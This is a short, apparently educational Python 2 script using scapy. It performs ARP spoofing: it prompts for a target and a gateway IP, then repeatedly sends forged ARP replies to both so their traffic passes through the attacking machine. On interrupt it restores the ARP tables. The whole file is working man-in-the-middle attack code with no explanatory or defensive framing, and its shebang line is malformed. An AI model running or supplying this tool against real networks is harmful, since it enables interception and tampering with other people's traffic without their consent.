#!usr/bin/env/ python
import scapy.all as scapy
import time
import sys

def scan(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    append = broadcast / arp_req
    ans = scapy.srp(append, timeout=1, verbose=False)[0]
    return ans[0][1].hwsrc

target_ip = raw_input("Target IP-->")
gateway_ip = raw_input("Gateway IP-->")
def spoof(target_ip, spoof_ip):
    target_mac = scan(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
def restore(destination_ip, source_ip):
    destination_mac = scan(destination_ip)
    source_mac = scan(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)
packet_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_count = packet_count + 2
        print("\r[+]Packets sent: " + str(packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n\n\n\n[-]CTRL+C detected.....Restoring ARP Table\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)